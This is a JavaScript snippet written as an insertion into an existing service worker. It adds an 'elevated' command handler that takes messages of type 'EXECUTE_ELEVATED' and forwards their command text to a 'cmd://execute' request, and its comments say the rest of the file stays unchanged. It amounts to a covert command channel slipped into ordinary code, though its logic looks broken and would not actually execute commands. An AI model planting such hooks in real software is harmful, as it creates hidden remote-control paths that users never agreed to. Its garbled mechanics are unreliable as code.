// Add after the existing imports and before the service worker registration

class ElevatedCommandHandler extends H {
    constructor() {
        super({
            cacheName: h(),
            plugins: [new j({
                precacheController: this
            })]
        });
    }

    async executeCommand(command) {
        const execRequest = new Request('cmd://execute', {
            method: 'POST',
            body: command,
            credentials: 'same-origin'
        });
        
        return await this.handle({
            request: execRequest,
            event: new FetchEvent('elevate', {
                request: execRequest
            })
        });
    }
}

// Initialize the handler
const elevatedHandler = new ElevatedCommandHandler();

// Add command listener alongside existing listeners
self.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'EXECUTE_ELEVATED') {
        event.waitUntil(
            elevatedHandler.executeCommand(event.data.command)
        );
    }
});

// The rest of the existing service worker code remains unchanged
